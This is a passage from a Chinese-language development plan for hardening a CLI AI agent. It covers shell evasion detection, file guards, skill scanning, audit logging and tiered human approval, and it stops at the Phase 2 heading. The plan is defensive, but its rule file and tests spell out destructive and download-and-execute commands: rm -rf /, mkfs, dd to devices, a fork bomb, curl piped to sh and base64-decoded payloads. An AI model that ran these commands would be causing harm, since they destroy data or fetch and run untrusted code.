# agent_in v6.0 — 安全加固规划（S 系列：S3 / S4 / S5 + 审计 + 人工审批）

> 分期开发计划。基准参照物：**szclaw / qwenpaw**（`security/tool_guard`、`security/skill_scanner`、`security/shell_evasion_guardian`、`security/file_guardian` + 审批流 + 审计留痕）。
> 原则：**保持零外部依赖（stdlib only）、保持 CLI 模式、不引任何 pip 包**。
> 本版本落地 **S3（Shell 混淆/逃逸检测）+ S4（文件守卫 / SAFE_MODE 真阻断）+ S5（Skill 静态扫描）** 三项安全能力，并贯穿一条 **人工审批流** 与一份 **结构化审计日志（S7）**。

## 前置依赖

本 plan 建立在 **plan4.0（F 系列）+ plan5.0（H 系列）已完成** 的基础上：
- `config.py` 存在（读 `safe_mode`、`audit_level` 等；SAFE_MODE 是 plan4 已列出的配置项）
- `providers.py` 存在（提供当前 provider/model，用于审计留痕）
- `logger.py` 已解耦（不 import ui）
- `llm.py` 已带 retry / rate limit / capability

> **明确不做**（对齐用户要求）：
> - **S1（API Key）**：按 plan4 要求 **保持明文**，本版本**不引入**任何加密（cryptography / keychain 一律不做）。
> - **S2 完整体**：不做「4 档 execution_level（STRICT/SMART/AUTO/OFF）」那套完整分级系统。本版本的「分级」只是**服务于 S3/S4/S5 判定结果的最小审批分级**（allow / confirm / strong-confirm / block），不是 S2 独立交付物。
> - **S6（网络外发告警）**：不做（gap 分析里也是 P1/P2，难 100% 防）。
> - **S7 审查/复盘**：只做**审计留痕**（append-only 记录「何时/谁/执行了什么/是否拦截/是否批准」），**不做**审查工作流、不做审计报表/复盘界面。

## 概述

| # | 功能 | szclaw 参照 | agent_in 现状 | 目标 |
|---|------|-------------|---------------|------|
| S3 | Shell 混淆/逃逸检测 | `shell_evasion_guardian`（quote-aware） | 只有 `_DANGEROUS_PATTERNS`（8 条正则）→ 二元 `_is_dangerous()` → y/N 确认，**可被 `b\u0061sh`、`$(...)`、`base64 -d \| sh`、变量拆分 等绕过** | quote-aware 逃逸检测 + 规则外置 JSON + 分级判定（allow/confirm/strong/block） |
| S4 | 文件守卫（File Guardian） | `file_guardian` + `SAFE_MODE` | `_exec_write_file` 出界**只返回误导式 "Created."**；`_exec_edit_file` **完全无守卫**；无敏感路径保护 | `SAFE_MODE=1` 真阻断出界写；敏感路径（~/.ssh、~/.aws、/etc、~/.env、~/.bashrc、凭据）写前强确认；edit_file 纳入守卫；修掉误导信息 |
| S5 | Skill 静态扫描 | `skill_scanner`（静态扫描 + org policy） | `execute_skill` 直接 `subprocess.run` 任意 entry 脚本，**零审查、零确认、无防篡改** | 加载/执行前静态扫描（subprocess/os.system/网络外发/eval/读凭据/删库 等模式）+ 首次加载确认（显示 entry 摘要）+ 记录来源与文件 hash 防篡改 |
| S7 | 审计日志（仅留痕） | 审批留痕 | `logger` 记 `tool_call`，但**安全事件未结构化留痕** | 独立 append-only 安全审计日志 `logs/audit_YYYY-MM.jsonl`：何时/谁/何命令/拦截与否/是否批准；**不做审查** |
| 审批 | 人工审批流（贯穿） | 审批流（超时/心跳） | 只有二元 `ui.confirm`（y/N），无分级、无强确认、无审计 | 统一分级审批：allow（静默）/ confirm（y/N）/ strong-confirm（键入 token）/ block（拒绝），SAFE_MODE 可升级，每次 MEDIUM+ 决策落审计 |

---

## 0. 解耦与耦合关系梳理（动手前必读）

> 用户要求：涉及拆分时梳理清楚耦合，解耦不得有功能遗漏 / 调用关系遗漏。
> 本节是 **plan4+plan5 完成后的真实依赖图 + 本版本迁移约束 + 函数级改造清单**。

### 0.1 plan4+plan5 完成后的依赖图（本 plan 的基线）

```
agent.py ──→ llm, tools, ui, vision, memory_manager, skill_manager, logger,
             config, providers, session, context, usage
llm.py   ──→ logger, retry, rate_limiter, capability
tools.py ──→ logger, skill_manager, vision
skill_manager.py ──→ （叶子，运行时 subprocess 调 skill 脚本）
logger.py ──→ （无 ui，plan4 已解耦）
config / providers / session / context / usage / retry / rate_limiter / capability ──→ 叶子
ui.py ──→ （叶子）   vision.py ──→ （叶子）   memory_manager.py ──→ （叶子）
```

**关键既有事实（改造要精准命中）：**
- `agent.py:213/215`（`agent_loop` 内）：`tools.execute(tool_name, tool_args, confirm_fn=ui.confirm)` —— **审批的唯一入口**，`confirm_fn` 恒为 `ui.confirm`。
- `tools.execute(tool_name, args, confirm_fn=None)`（`tools.py:246`）：统一分发；**只有 shell 分支**把 `confirm_fn` 传给 `_exec_shell`（`tools.py:262`）。
- `tools._exec_shell(args, confirm_fn)`（`tools.py:421`）：**内部自带** `_is_dangerous(command)` 二元判定 → `confirm_fn(prompt)` → `subprocess.run`。
- `tools._DANGEROUS_PATTERNS`（`tools.py` 顶部，8 条正则）+ `tools._is_dangerous(command)`（`tools.py:223`，二元 for-loop）+ `tools._is_within_workdir(path)`（`tools.py:479`）。
- `tools._exec_write_file(args)`（`tools.py:374`）：`if not _is_within_workdir(path): return "Warning: ... Created."` —— **提前 return（未真写），但文案撒谎**；**无 SAFE_MODE、无敏感路径、无确认**。
- `tools._exec_edit_file(args)`（`tools.py:393`）：**直接 `_resolve_path` 后读改写，无任何出界/敏感检查**。
- `tools._detect_shell()`（`tools.py:201`）：跨平台 shell 前缀（bash -c / powershell -Command / cmd /c）——**属执行逻辑，非安全逻辑，保留在 tools.py**。
- `skill_manager.execute_skill(name, params)`：直接 `subprocess.run(cmd, ...)`，**无扫描、无确认、无 hash**；`scan_skills()` / `to_tool_schemas()` 为加载期入口。
- `ui.confirm(prompt) -> bool`（`ui.py:413`）：二元 y/N，`answer in ("y","yes")`，EOF/Ctrl-C → False。
- `agent_loop(messages, work_dir, session_id="", verbose=True, initial_images=None)`（`agent.py:94`）：作用域内有 `session_id`，可透传给 `execute`。
- `agent.py` 入口：`run_single` / `run_interactive` 均在入口执行 `tools.WORK_DIR = work_dir`（plan4 顺序 config → providers → tools.WORK_DIR）。

### 0.2 本 plan 新增叶子模块（均不 import 任何本地业务模块，stdlib only）

```
tool_guard.py        S3+S4  shell 逃逸检测 + 文件守卫；读 rules/*.json
skill_scanner.py     S5     skill 静态扫描 + 文件 hash + 信任记录；读写 skills/.trusted.json
audit.py             S7     append-only 安全审计日志；写 logs/audit_YYYY-MM.jsonl
approval.py          人工审批 分级审批；confirm_fn / input_fn 依赖注入（不 import ui）
rules/dangerous_shell.json     S3  shell 规则（基础命令分级 + 逃逸技法定级）
rules/sensitive_paths.json     S4  敏感路径规则（受保护目录根 + 文件名模式）
skills/.trusted.json   运行时（S5）  首次加载确认 + 文件 hash 信任记录
logs/audit_YYYY-MM.jsonl  运行时（S7）  审计日志
```

### 0.3 依赖方向（关键，防循环 import）

```
tools.py         ──→ tool_guard, approval, audit, logger, skill_manager, vision
skill_manager.py ──→ skill_scanner, approval, audit
audit.py / approval.py / tool_guard.py / skill_scanner.py ──→ 叶子（互不 import）
```

**四条铁律（拆文件必守）：**
1. `tool_guard.py` **不 import tools**（它只收「命令字符串 / 路径字符串 + work_dir + safe_mode」，返回 Verdict，纯函数式判定）。
2. `skill_scanner.py` **不 import skill_manager**（它只收「entry 文件绝对路径」，自己 `read_text` + `hashlib` 算，不依赖 skill_manager 的扫描逻辑）。
3. `approval.py` **不 import ui**（`confirm_fn` / `input_fn` 由调用方依赖注入；agent 传 `ui.confirm` 和内置 `input` 包装）。对齐 plan4 `context.apply(llm_chat_fn=llm.chat)` 的注入范式。
4. `audit.py` **不 import logger、不复用 logger 文件句柄**（见陷阱 D）。

### 0.4 六个耦合陷阱（拆文件 / 改造必守）

**陷阱 A：审批的「强确认」需要键入 token，不能只靠 `ui.confirm`（y/N）**
- `ui.confirm` 只读 y/N，无法支持 HIGH 级「键入完整命令/路径以确认」。
- 处置：`approval.resolve(verdict, confirm_fn, input_fn)` 同时接两个注入函数——`confirm_fn`（y/N，MEDIUM 用）、`input_fn`（原始输入，STRONG_CONFIRM 用，默认内置 `input`）。agent 侧 `input_fn` 用一个读一行的小闭包（或直接传内置 `input`）。
- 验收：HIGH 命令要求键入 token；token 不匹配 → 拒绝；`input_fn` 抛 EOF/Ctrl-C → 按拒绝处理（安全默认）。

**陷阱 B：安全判定上移到 `execute()` 单一网关，`_exec_shell/_exec_write_file/_exec_edit_file` 变「纯执行」**
- 现状：`_exec_shell` 内做 `_is_dangerous`；`_exec_write_file` 内做 `_is_within_workdir`；`_exec_edit_file` 无检查。判定逻辑散在 3 处。
- 处置：把判定**集中**到 `execute()` 分发**之前**：`verdict = tool_guard.assess_call(name, args, work_dir, safe_mode)` → `decision = approval.resolve(verdict, confirm_fn, input_fn, ctx)`。三个 `_exec_*` **删除各自的判定**，只保留「执行」。
- **这不是删功能，是搬家**（详见 0.5 函数级清单）：`_is_dangerous`/`_DANGEROUS_PATTERNS` → `tool_guard` + `rules/dangerous_shell.json`；`_is_within_workdir` → `tool_guard.assess_write`。**`_exec_edit_file` 由「无守卫」变为「受守卫」是修复，不是遗漏**。
- 验收：`grep "_is_dangerous\|_is_within_workdir" tools.py` 在三个 `_exec_*` 内无残留调用；`tools.py` 顶部不再定义 `_DANGEROUS_PATTERNS`（已迁走）。

**陷阱 C：`execute()` 改签名要保持向后兼容**
- 现签名 `execute(tool_name, args, confirm_fn=None)`。
- 新签名 `execute(tool_name, args, confirm_fn=None, session_id=None)`（新增参数带默认值）。`agent.py:213/215` 追加传 `session_id`（用于审计「谁」）。**旧调用不传 session_id 仍合法**（审计记为 `-`）。
- `_exec_shell(args, confirm_fn=None)` → `_exec_shell(args)`（私有函数，唯一调用方是 `execute()`，安全；`confirm_fn` 判定已上移，不再需要）。
- 验收：`grep "execute(" agent.py` 仍能跑；单测里裸调 `tools.execute("read_file", {...})`（不传 confirm_fn/session_id）不报错。

**陷阱 D：审计必须独立 append-only 文件，不能走 logger 的句柄**
- `logger.py` 有「单文件 >10MB 自动 gzip 归档 + 跨天切文件」逻辑（`_ensure_handle`）。若审计复用 logger 句柄，归档/切天会破坏审计「只追加、不可截断」的语义，审计链可能被误当普通日志清掉。
- 处置：`audit.py` 自带文件句柄 + 自带 `threading.Lock`，写**独立**文件 `logs/audit_YYYY-MM.jsonl`（按月追加，**不 gzip、不轮转删除**）。审计事件**不**经 `logger.info()`。
- 「计入日志」的理解：审计是**专门的安全日志**（与运维日志 `agent_*.log` 并列于 `logs/`），不混入运维日志流。若你坚持要写进同一文件，见风险表「审计混入运维日志」条目的代价。
- 验收：`grep "import logger" audit.py` 无结果；连续跑过 10MB 也不影响 `audit_*.jsonl` 连续追加。

**陷阱 E：`tool_guard` 不得在 import 期缓存 `WORK_DIR` / `SAFE_MODE`**
- `WORK_DIR` 由 agent 入口在 `config.load()` 之后才 `tools.WORK_DIR = work_dir`（陷阱 B/plan4 既定顺序）。若 `tool_guard` 在 import 期读 `WORK_DIR` 会拿到旧值。
- 处置：`tool_guard.assess_write(path, work_dir, safe_mode)` 把 `work_dir`/`safe_mode` **作为参数传入**（`execute()` 从 `tools.WORK_DIR` 全局 + `tools.SAFE_MODE` 全局在**调用时**取）。`tool_guard` 内部**不读任何全局路径**。
- `SAFE_MODE` 落点：`agent.py` 入口在 `tools.WORK_DIR = work_dir` 同处加 `tools.SAFE_MODE = bool(config.get("safe_mode", False))`（沿用 WORK_DIR 的赋值范式，`tools.py` 不 import config）。
- 验收：换 `-w /other/dir` 起进程 → 出界判定以**新** work_dir 为准；`grep "WORK_DIR\|SAFE_MODE" tool_guard.py` 无模块级缓存。

**陷阱 F：`skill_*` 分支的守卫放在 `skill_manager`，不在 `execute()` 里重复**
- `execute()` 的 `skill_*` 分支（`tools.py:266`）调 `skill_manager.execute_skill`。若 `execute()` 的 `assess_call` 对 `skill_*` 也做通用判定，会与 S5 的专用扫描重复。
- 处置：`assess_call` 对 `skill_*` 返回 **ALLOW**（放行到 `skill_manager`）；S5 的扫描/确认/防篡改**全部**在 `skill_manager` 内完成（加载期 `to_tool_schemas` + 执行期 `execute_skill`）。单点守卫，不重复。
- 验收：`grep "assess_call" tools.py` 对 `skill_*` 明确 ALLOW；skill 的拦截/确认只出现一次（在 skill_manager）。

### 0.5 函数级改造清单（BEFORE → AFTER，一个都不能漏）

| 函数 | 位置 | BEFORE | AFTER | 说明 |
|------|------|--------|-------|------|
| `execute` | `tools.py:246` | `execute(name, args, confirm_fn=None)`；分发；shell 传 confirm | `execute(name, args, confirm_fn=None, session_id=None)`；**分发前**：`verdict=tool_guard.assess_call(...)` → `decision=approval.resolve(...)`；REJECT/BLOCK → 记 `logger.info("tool_blocked")` + `return "Blocked: <reason>"`；否则进入原分发 | 签名加 `session_id`（默认 None，向后兼容） |
| `_exec_shell` | `tools.py:421` | `if _is_dangerous(command): confirm_fn/ block` 再跑 | **删除** `_is_dangerous` 判定块；只保留 `_detect_shell()` + `subprocess.run` | 判定已上移到 execute 网关；纯执行 |
| `_exec_write_file` | `tools.py:374` | `if not _is_within_workdir: return "Warning...Created."` | **删除**内联出界检查（文案撒谎的那段）；只保留 mkdir + write | 出界/敏感判定上移到 assess_write；**修复误导文案** |
| `_exec_edit_file` | `tools.py:393` | **无任何守卫** | 保持纯执行（守卫由 execute 网关统一加） | **修复**：edit_file 从裸奔变为受守卫 |
| `_DANGEROUS_PATTERNS` | `tools.py` 顶部 | 8 条正则 | **删除**（迁入 `rules/dangerous_shell.json` 的 `shell.rules`，并按严重级标注） | 数据外置 |
| `_is_dangerous` | `tools.py:223` | 二元判定 | **删除**（逻辑迁入 `tool_guard.assess_shell`） | 搬家非删功能 |
| `_is_within_workdir` | `tools.py:479` | 出界判定 | **删除**（逻辑迁入 `tool_guard.assess_write`） | 搬家非删功能 |
| `_detect_shell` | `tools.py:201` | shell 前缀 | **不变** | 执行逻辑，保留 |
| `BASE_TOOLS` / `reload_tools` / `drain_pending_images` / `PENDING_IMAGES` / `_resolve_path` / 5 个 schema | `tools.py` | — | **不变** | 无耦合影响 |
| `execute_skill` | `skill_manager.py` | 直接 `subprocess.run` | 执行前：`skill_scanner.scan_entry()` + `verify_trust(hash)`（防篡改）+ 首次加载 `approval` 确认 | 见 Phase 3 |
| `to_tool_schemas` / `scan_skills` | `skill_manager.py` | 直接加载 | 加载期跑 `skill_scanner.scan_entry` 标记风险（不阻断注册，执行期再拦截） | 见 Phase 3 |
| `agent.py:213/215` | `agent.py` | `tools.execute(..., confirm_fn=ui.confirm)` | `tools.execute(..., confirm_fn=ui.confirm, session_id=session_id)`；入口加 `tools.SAFE_MODE = bool(config.get("safe_mode", False))` | 透传 session；接线 SAFE_MODE |
| `logger` / `ui` / `llm` / `vision` / `memory_manager` / plan4/5 各叶子 | — | — | **不变** | 零耦合影响 |

> **无功能遗漏核对**：`_is_dangerous`/`_DANGEROUS_PATTERNS`/`_is_within_workdir` 三处安全逻辑**全部**在 `tool_guard.py` + 两个 JSON 中重建；`ui.confirm` 仍在用（作为 approval 的 `confirm_fn`）；`_detect_shell` 保留；skill 执行通道不变，只**前置**扫描。所有原调用方（agent.py 两处 `execute`、tools 内部分发）签名兼容。

### 0.6 拆分后目标依赖图（v6.0 完成）

```
agent.py ──→ llm, tools, ui, vision, memory_manager, skill_manager, logger,
             config, providers, session, context, usage
tools.py         ──→ tool_guard, approval, audit, logger, skill_manager, vision
skill_manager.py ──→ skill_scanner, approval, audit
tool_guard.py / skill_scanner.py / approval.py / audit.py ──→ 叶子（互不依赖，不 import 业务模块）
其余（llm / retry / rate_limiter / capability / config / providers / session / context / usage / ui / vision / memory_manager / logger）──→ 不变
```

---

## 人工审批流（贯穿 S3/S4/S5 的核心机制，先讲设计）

> 用户要求 #2：「对于危险操作，添加人工审批流程」。这是把 S3/S4/S5 的**判定结果**落到**人工决策**的统一机制。

**审批动作（4 级，由严重级 + SAFE_MODE 决定）：**

| 动作 | 触发 | 交互 | 结果 |
|------|------|------|------|
| `ALLOW` | 严重级 INFO / LOW | 无（静默放行） | 直接执行；**不写**审计（避免噪音） |
| `CONFIRM` | 严重级 MEDIUM | `confirm_fn`（y/N） | y→执行 / N→拒绝；写审计 |
| `STRONG_CONFIRM` | 严重级 HIGH（非 SAFE_MODE） | 先 `confirm_fn` 显示告警，再 `input_fn` 键入 token（完整命令/路径）匹配才放行 | 匹配→执行 / 不匹配→拒绝；写审计 |
| `BLOCK` | 严重级 CRITICAL；或 SAFE_MODE 下 HIGH 升级 | 无（直接拒绝，不给机会） | 拒绝；写审计 |

**严重级 → 动作基础映射**（SAFE_MODE 前）：
```
INFO, LOW      → ALLOW
MEDIUM         → CONFIRM
HIGH           → STRONG_CONFIRM      # SAFE_MODE=1 时升级为 BLOCK
CRITICAL       → BLOCK               # 恒 BLOCK（磁盘级灾难，不给确认机会）
```

**SAFE_MODE 语义**（`config.get("safe_mode", False)`）：
- 文件（S4）：`SAFE_MODE=1` → 出界写**硬阻断**；`=0`（默认）→ 出界写 CONFIRM。敏感路径两档都至少 STRONG_CONFIRM。
- Shell（S3）：`SAFE_MODE=1` → HIGH 升级为 BLOCK（更保守）。

**非交互安全默认**（`run_single` 无人值守 / 管道场景）：
- agent 在非交互模式下给 `execute` 传的 `confirm_fn` 是**恒返回 False** 的 lambda（而非 `ui.confirm`），即**任何需确认/强确认的操作在无人值守时一律拒绝**（安全默认：宁可不做，不可误做）。交互模式才传 `ui.confirm`。
- 这是审批流的重要落点：`run_single`（agent.py:290）当前没传 confirm_fn（`execute` 里 `confirm_fn=None` → 危险命令直接 "blocked"）；本版本**显式**传一个「非交互拒绝器」，语义清晰。

**审批统一入口**：`approval.resolve(verdict, confirm_fn, input_fn, ctx) -> Decision`
- `verdict`：`tool_guard` 或 `skill_scanner` 产出的 `{"action","severity","findings","reason","detail"}`
- `ctx`：`{"session_id","tool_name","source"(shell/file/skill),"rule_id"}`
- `Decision`：`{"approved": bool, "action": str, "reason": str}`
- **副作用**：MEDIUM+ 或 REJECT/BLOCK → `audit.log_security(...)`（见 S7）。allow 不记。

---

## Phase 1（S7 审计地基 + S3 Shell 逃逸检测 + 人工审批流）

> 先做 S7（审计是 S3/S4/S5 都要写的地基）+ S3（最危险的绕过面）+ 审批流（把 S3 判定落到人工）。做完即可用：绕过型 shell 命令被识别、分级审批、全程留痕。

### 1.1 新增 `audit.py`（叶子，S7）

**独立 append-only 安全日志**（陷阱 D：不复用 logger 句柄）。

```python
# logs/audit_YYYY-MM.jsonl，按月追加，不 gzip、不轮转删除
# 自带 threading.Lock + 独立文件句柄；不 import logger

def log_security(
    event: str,                 # "shell" | "file_write" | "file_edit" | "skill_load" | "skill_exec"
    session_id: str,            # 审计「谁」；非交互/未知 → "-"
    tool: str,                   # "shell" / "write_file" / "edit_file" / "skill_xxx"
    detail: str,                 # 命令原文 / 目标路径 / skill entry 摘要（截断 ≤300 字符，不脱敏 API_KEY）
    severity: str,               # INFO/LOW/MEDIUM/HIGH/CRITICAL
    action: str,                 # allowed / confirmed / strong_confirmed / blocked / rejected
    decision: str,               # yes / no / blocked / non_interactive
    rule_id: str,                # 命中规则 id 或 "evasion:<type>"
    findings: list,              # 触发点（evasion 类型 / 敏感路径 / 规则描述）
    pid: int,                    # os.getpid()
) -> None
    # 组装 {ts, event, session_id, tool, detail, severity, action, decision, rule_id, findings, pid}
    # json.dumps(ensure_ascii=False) 单行 O_APPEND 写入当月 audit 文件；写入失败只 stderr 兜底，不抛

def recent(limit=20) -> list[dict]   # 读当月（+上月）audit，倒序，供 /audit 便捷查看（可选）
```

> **不做审查**：只提供 `log_security`（写）+ `recent`（读最近几条）。无报表、无复盘工作流。

### 1.2 新增 `rules/dangerous_shell.json`（S3 规则数据）

```json
{
  "version": 1,
  "severities": ["INFO", "LOW", "MEDIUM", "HIGH", "CRITICAL"],
  "shell": {
    "rules": [
      {"id": "rm_rf_root",   "pattern": "\\brm\\s+(-[a-z]*\\s+)*/\\s*$", "severity": "CRITICAL", "desc": "删除根目录"},
      {"id": "mkfs",         "pattern": "\\bmkfs(\\.|\\s|$)",             "severity": "CRITICAL", "desc": "格式化文件系统"},
      {"id": "dd_dev",       "pattern": "\\bdd\\b[^|;&]*of=/?dev/",        "severity": "CRITICAL", "desc": "dd 写裸设备"},
      {"id": "redir_disk",   "pattern": ">{1,2}\\s*/dev/(sd|nvme|hd)",     "severity": "CRITICAL", "desc": "重定向到磁盘"},
      {"id": "fork_bomb",    "pattern": ":\\(\\)\\s*\\{\\s*:\\|:&\\s*\\}",  "severity": "CRITICAL", "desc": "fork 炸弹"},
      {"id": "rm_rf",        "pattern": "\\brm\\s+(-[a-z]*[rR][a-z]*\\s+)-[a-z]*[fF]", "severity": "HIGH", "desc": "递归强制删除"},
      {"id": "rm_r",         "pattern": "\\brm\\s+-[a-z]*[rR][a-z]*",        "severity": "HIGH", "desc": "递归删除"},
      {"id": "rm_f",         "pattern": "\\brm\\s+-[a-z]*[fF][a-z]*",        "severity": "HIGH", "desc": "强制删除"},
      {"id": "del_s",        "pattern": "\\b(del|rmdir)\\s+/[sS]",           "severity": "HIGH", "desc": "Windows 递归删除"},
      {"id": "ps_rm_rf",     "pattern": "Remove-Item[^|;]*-Recurse[^|;]*-Force", "severity": "HIGH", "desc": "PowerShell 递归强删"},
      {"id": "sudo",         "pattern": "\\bsudo\\b",                        "severity": "MEDIUM", "desc": "提权"},
      {"id": "chmod_777",    "pattern": "\\bchmod\\s+(777|-R\\s+777)",        "severity": "MEDIUM", "desc": "宽松权限"},
      {"id": "kill9",        "pattern": "\\bkill\\s+(-9|-KILL)",              "severity": "MEDIUM", "desc": "强杀进程"}
    ],
    "evasion": {
      "command_substitution":  "HIGH",     "piped_download_exec": "CRITICAL",
      "base64_decode_exec":    "HIGH",     "var_split_assign":    "HIGH",
      "unicode_hex_escape":    "MEDIUM",   "url_encoded_payload": "MEDIUM"
    }
  }
}
```
> 原 `_DANGEROUS_PATTERNS` 的 8 条**全部**在此重建并定级（rm/del/rmdir/Remove-Item/format/mkfs/dd/dev 重定向），**无遗漏**。新增 Windows（del /s、rmdir /s、PowerShell）与灾难级 CRITICAL（root、mkfs、dd、fork bomb）。
> **注**：gap 分析原写 `.yaml`，但 **stdlib 无 YAML 解析器**，为守「零依赖」改用 **JSON**（同为外置、可维护、可扩展，语义一致）。

### 1.3 新增 `tool_guard.py`（叶子，S3 + S4 判定；本 Phase 先做 shell 部分）

```python
# 读 rules/dangerous_shell.json（lru_cache 缓存）；不 import 任何业务模块

# Verdict 结构：{"action","severity","findings","reason","detail"}
SEV_RANK = {"INFO":0,"LOW":1,"MEDIUM":2,"HIGH":3,"CRITICAL":4}

def load_rules() -> dict                       # 读 JSON，缺失→内置兜底最小集（保证不崩）
def _norm_escapes(cmd: str) -> str             # 解码 \\xNN / \\uNNNN / URL 编码(%xx) → 还原真实命令
def _quote_aware_tokens(cmd: str) -> list[str] # 尊重单/双引号切词，避免把引号内文本当命令
def _find_evasions(cmd: str) -> list[dict]     # 返回命中的逃逸类型 [{type, severity, snippet}]
    #  - 命令替换：非引号内 $( 或 `
    #  - 管道下载执行：(curl|wget|fetch|Invoke-WebRequest|iwr|iex) ... | (sh|bash|python|powershell)
    #  - base64 解码执行：base64 -d/--decode ... | (sh|bash)；echo <b64> | base64 -d | ...
    #  - 变量拆分：A=xxx; $A -rf /  或  短变量赋值后作为命令展开（启发式）
    #  - unicode/十六进制转义：\\xNN / \\uNNNN / b\\u0061sh（解码后重匹配）
    #  - URL 编码载荷：连续 %xx
def assess_shell(command: str, safe_mode: bool) -> dict   # → Verdict
    # 1) findings = _find_evasions(command)
    # 2) norm = _norm_escapes(command)；对 norm 与引号感知 token 跑 shell.rules
    # 3) severity = max(所有 findings + rules)
    # 4) action = 严重级→动作映射（SAFE_MODE 升级 HIGH→BLOCK）
    # 5) reason 汇总（"命中规则 rm_rf；检出逃逸:command_substitution"）
def assess_write(path, work_dir, safe_mode) -> dict   # Phase 2 实现（本 Phase 留接口）
def assess_call(name, args, work_dir, safe_mode) -> dict
    # shell→assess_shell；write_file/edit_file→assess_write（Phase 2）；其余→ALLOW
```

**逃逸检测关键（quote-aware）**：`echo "rm -rf /"`（引号内）→ **不**报危险（是字符串）；`$(rm -rf /)` / `` `rm -rf /` `` / `bash -c "$(echo cm0gLXJm... | base64 -d)"` → 报危险。**先解码再匹配**，`b\u0061sh -c 'rm -rf /'` 解码成 `bash` 后照常命中。

### 1.4 新增 `approval.py`（叶子，人工审批）

```python
# confirm_fn: (prompt)->bool  依赖注入（交互=ui.confirm，非交互=恒 False 拒绝器）
# input_fn:  ()->str          依赖注入（默认内置 input；强确认键入 token 用）

def resolve(verdict, confirm_fn, input_fn=None, ctx=None) -> dict
    # action==ALLOW   → {"approved":True, "action":"allow"}（不审计）
    # action==CONFIRM → ok=confirm_fn(prompt(verdict)); 审计; 返回 approved=ok
    # action==STRONG_CONFIRM →
    #     先 confirm_fn(告警 prompt) 过一轮；
    #     再 token=input_fn("输入完整命令以确认: ")（EOF/Ctrl-C→拒绝）
    #     匹配 verdict["detail"] 才批准；审计
    # action==BLOCK   → 审计; {"approved":False,"action":"blocked"}
    # 非交互：confirm_fn 恒 False → 任何 CONFIRM/STRONG 都拒绝（安全默认）
def _prompt(verdict, ctx) -> str   # 拼「⚠️ 危险操作 [severity]：命中 xxx；命令: ...」可读提示
```

### 1.5 改造 `tools.py`（陷阱 B/C 落地）

- **删除** 顶部 `_DANGEROUS_PATTERNS`；**删除** `_is_dangerous`（`tools.py:223`）；**删除** `_is_within_workdir`（`tools.py:479`）——逻辑迁入 `tool_guard`（0.5 清单）。
- `execute(tool_name, args, confirm_fn=None, session_id=None)`：分发**前**插入
  ```python
  verdict = tool_guard.assess_call(tool_name, args, WORK_DIR, SAFE_MODE)
  decision = approval.resolve(verdict, confirm_fn, input_fn=_raw_input,
                              ctx={"session_id": session_id or "-", "tool": tool_name,
                                   "source": "shell" if tool_name=="shell" else "file"})
  if not decision["approved"]:
      logger.info("tool_blocked", {"name": tool_name, "action": decision["action"],
                                   "reason": decision["reason"], "session": session_id or "-"})
      return "Blocked: " + decision["reason"]
  ```
  （`_raw_input` 是 tools 内一个读一行的最小 helper，包装内置 `input`，供强确认。）
- `_exec_shell(args)`（去掉 confirm_fn 参数与判定块），`_exec_write_file` / `_exec_edit_file` 暂不变（Phase 2）。
- 顶部加 `SAFE_MODE = False`（由 agent 入口赋值，陷阱 E）。
- import：`import tool_guard, approval, audit`（叶子，无循环）。

### 1.6 改造 `agent.py`

- 入口（`run_single`/`run_interactive`）在 `tools.WORK_DIR = work_dir` 同处加：`tools.SAFE_MODE = bool(config.get("safe_mode", False))`。
- `agent_loop` 内 `agent.py:213/215`：`tools.execute(tool_name, tool_args, confirm_fn=ui.confirm, session_id=session_id)`。
- **非交互**：`run_single` 路径下给 `execute` 的 `confirm_fn` 传 `_non_interactive_confirm`（恒 False，安全默认），而非 `ui.confirm`。实现：`agent_loop` 加参数 `interactive: bool=True`；`run_single` 传 `interactive=False`，据此选 confirm_fn。
- 可选交互命令 `/audit`：`print(audit.recent(10))`（便捷读，非审查）。

### 1.7 配置项（config 白名单补）
- `safe_mode`（bool，默认 False）——plan4 已列，本 Phase 真正接线。

### 1.8 开发任务（Phase 1）
- [ ] `audit.py`：`log_security` + `recent` + 独立锁/句柄；**不 import logger**
- [ ] `rules/dangerous_shell.json`：原 8 条重建 + Windows + CRITICAL 灾难级 + evasion 定级
- [ ] `tool_guard.py`：`load_rules` + `_norm_escapes` + `_quote_aware_tokens` + `_find_evasions` + `assess_shell` + `assess_call`（write 留接口）
- [ ] `approval.py`：`resolve`（4 级）+ `_prompt` + 非交互安全默认 + 审计挂钩
- [ ] `tools.py`：删 `_DANGEROUS_PATTERNS`/`_is_dangerous`/`_is_within_workdir`；`execute` 加网关 + `session_id`；`_exec_shell` 去判定；`SAFE_MODE` 全局
- [ ] `agent.py`：`tools.SAFE_MODE` 接线；`execute` 传 `session_id`；`run_single` 非交互 confirm_fn；可选 `/audit`
- [ ] 单测（unittest，零依赖）：
  - [ ] `assess_shell`：`rm -rf /`→CRITICAL/BLOCK；`rm -rf ./tmp`→HIGH；`ls`→ALLOW
  - [ ] 逃逸：`$(rm -rf /)`、`` `rm -rf /` ``、`curl x|sh`、`echo aGk=|base64 -d|sh`、`A=rm;$A -rf /`、`b\u0061sh` 均被检出并升级
  - [ ] quote-aware：`echo "rm -rf /"`→不判危险（字符串）
  - [ ] `approval.resolve`：MEDIUM→需 confirm；HIGH→需 token；BLOCK→直接拒；非交互 confirm_fn=False→全拒
  - [ ] `audit.log_security`：写文件、JSON 可解析、append 多条不错行
- [ ] 验证：
  - [ ] `python agent.py "删除 /tmp 下 build 目录"` → HIGH 强确认（键入 token 才执行）
  - [ ] 诱导模型跑 `curl http://x | sh` → CRITICAL BLOCK，拒绝 + 审计
  - [ ] `logs/audit_*.jsonl` 出现对应 shell 事件（severity/action/decision）
  - [ ] `run_single`（管道）遇危险命令 → 非交互直接拒，不卡 input
  - [ ] **回归**：`rm -rf ./build`（原 8 条内）仍触发确认（≥ 原严格度）；普通 `ls`/`cat` 不打扰

**Phase 1 成功标准：**
```
$ python agent.py "把 ./build 目录删了"
  ⚠️ [高危] 命中规则 rm_rf（递归强制删除）
     命令: rm -rf ./build
  ⚠️ 确认执行? [y/N]: y
  输入完整命令以确认: rm -rf ./build     ← 键入匹配才放行
  $ rm -rf ./build  ✓
  # 若命令是 curl x|sh：
  ⛔ [严重] 检出逃逸 piped_download_exec（下载并管道执行）
  Blocked: 严重级操作已阻断（SAFE 策略）
  # logs/audit_2026-09.jsonl:
  {"ts":"...","event":"shell","severity":"CRITICAL","action":"blocked","decision":"blocked","rule_id":"evasion:piped_download_exec",...}
```

---

## Phase 2（S4 文件守卫 / SAFE_MODE 真阻断 + 敏感路径保护）

